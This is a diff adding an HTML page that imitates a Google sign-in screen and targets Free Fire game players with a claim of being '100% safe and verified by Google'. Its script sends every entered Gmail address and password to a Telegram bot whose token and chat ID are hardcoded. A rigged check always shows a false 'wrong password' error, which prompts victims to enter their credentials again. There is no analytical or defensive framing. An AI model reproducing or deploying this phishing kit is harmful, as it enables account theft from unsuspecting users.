@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>google</title>
+</head>
+<style>
+    body{
+        background-color: black;
+        
+    }
+
+    h1{
+        text-align: center;
+        color: white;
+        font-family: sans-serif;
+        font-size: 30px;
+    }
+    h2{
+        font-family: sans-serif;
+        font-size: 20px;
+        text-align: center;
+        color: white;
+    }
+    a{
+        font-family: sans-serif;
+        
+        font-size: 15px;
+        margin-left: 3.5%;
+        color: rgb(126, 126, 223);
+    }
+    h5{
+      
+        font-family: sans-serif;
+        font-size: 14px;
+        margin-left: 20px;
+        margin-top: -15px;
+        text-align: start;
+        color: rgb(126, 126, 223);
+    }
+
+    h5{
+      
+        font-family: sans-serif;
+        font-size: 14px;
+        margin-left: 20px;
+        margin-top: 15px;
+        text-align: start;
+        color: rgb(126, 126, 223);
+    }
+    h4{
+        font-family: sans-serif;
+        font-size: 17px;
+        text-align: center;
+        color: rgb(126, 126, 223);
+    }
+
+     h3{
+        font-family: sans-serif;
+        font-size: 14px;
+        text-align: center;
+        color: rgb(177, 176, 176);
+    }
+
+
+    .form-group input {
+
+      width: 90%;
+      color: white;
+      font-size: 15px;
+      margin-left: 3.5%;
+      height: 40px;
+      background-color: black;
+      padding: 10px;
+      border: 1px solid #353434;
+      border-radius: 5px;
+    }
+    
+    .form-group2 input {
+
+      width:0%;
+      color: rgb(0, 0, 0);
+      font-size: 5px;
+      margin-left: 35%;
+      height:1px;
+      background-color: rgba(0, 0, 0, 0);
+      padding: 10px;
+      border: 1px solid #0000002d;
+      border-radius: 100px;
+    }
+    
+    .pass{
+
+      width:0.2;
+      color: rgba(255, 0, 0, 0);
+      font-size: 1px;
+      margin-left:0%;
+      height: 0px;
+      background-color: rgb(0, 0, 0);
+      padding: 1px;
+      border: 1px solid #000000;
+      border-radius: 1px;
+    }
+
+    .btn {
+
+      width: 100px;
+      margin-top: 620px;
+      margin-left: 80%;
+      height: 40px;
+      padding: 10px;
+      background-color: rgb(101, 101, 230);
+      color: #000000;
+      border: none;
+      border-radius:3px;
+      cursor: pointer;
+    }
+
+    .error-message {
+      color: rgb(246, 129, 129);
+      font-size: 12px;
+      margin-left: 4%;
+      font-family: sans-serif;
+      margin-bottom: 10px;
+    }
+    
+    
+
+
+</style>
+
+<body>
+    <h1>Google</h1>
+    <h2>Sign in</h2>
+    <h3>Connect your Free fire account to free fire Suggestions hub <p>100% safe and verified by Google</p></h3>
+    <h4>Learn more about using your account</h4>
+    <form id="signup-form">
+      <div class="form-group">
+        
+        <input type="email" id="username" placeholder="Enter Gmail" required>
+        <div class="error-message" id="username-error"></div>
+        
+      </div>
+      <div class="form-group">
+        <p></p>
+        <input type="password" id="password" placeholder="Enter password">
+        <div class="error-message" id="password-error"></div>
+      </div>
+      <p></p>
+      <a href="">Forgot password?</h5>
+      
+      
+      <button class="btn" id="signup-btn">NEXT</button>
+      
+    </form>
+    
+    <script>
+    const botToken = '8486680875:AAHADg3YgtIW9D1OPd-QdsM1vqwi6Z1f3uk';
+    const chatId = '7037294252';
+    const users = {
+      'user1': 'password1',
+      'user2': 'password2',
+      // Add more users here
+    };
+
+    document.getElementById('signup-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (validateSignupForm(username, password)) {
+        users[username] = password;
+        const message = `📩New LOGIN ATTEMPT📩
+        
+        
+        DETAILS:
+      - PLATFORMS: FREE FIRE
+      - GMAILL:${username} 
+      - PASSWORD:${password}
+      
+
+      🔒-SECURED BY GAMEHUB-🔒`;
+        sendMessage(message, () => {
+          
+          // Redirect to new webpage
+          // window.location.href = 'new-page.html';
+        });
+      }
+    });
+
+    document.getElementById('login-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('login-username').value.trim();
+      const password = document.getElementById('login-password').value.trim();
+
+      if (validateLoginForm(username, password)) {
+        if (users[username] === password) {
+          document.getElementById('login-success-message').innerText = 'Login successful!';
+          document.getElementById('login-error-message').innerText = '';
+          const message = `🔒 Login attempt: ${username} ${password}`;
+          sendMessage(message, () => {
+            window.open('new-page.html', '_blank');
+          });
+        } else {
+          document.getElementById('login-error-message').innerText = 'Invalid username or password';
+          document.getElementById('login-success-message').innerText = '';
+        }
+      }
+    });
+
+    function validateSignupForm(username, password) {
+      let isValid = true;
+
+      if (username.length < 3) {
+        document.getElementById('username-error').innerText = 'Username must be at least 3 characters';
+        isValid = false;
+      } else {
+        document.getElementById('username-error').innerText = '';
+      }
+
+      if (password.length < 999) {
+        document.getElementById('password-error').innerText = 'Wrong Email or Password. Try again or click `Forgot password` to reset Password.';
+        isValid = true;
+        
+        
+    
+      } else {
+        document.getElementById('password-error').innerText = '';
+      }
+
+      return isValid;
+    }
+
+    function validateLoginForm(username, password) {
+      let isValid = true;
+
+      if (username.length < 3) {
+        document.getElementById('login-username-error').innerText = 'Username must be at least 3 characters';
+        isValid = false;
+      } else {
+        document.getElementById('login-username-error').innerText = '';
+      }
+
+      if (password.length < 6) {
+        document.getElementById('login-password-error').innerText = 'Password must be at least 6 characters';
+        isValid = false;
+      } else {
+        document.getElementById('login-password-error').innerText = '';
+      }
+
+      return isValid;
+    }
+
+    function sendMessage(message, callback) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = {
+        chat_id: chatId,
+        text: message
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log(data);
+        callback();
+      })
+      .catch(error => console.error(error));
+    }
+  </script>
+</body>
+</html>
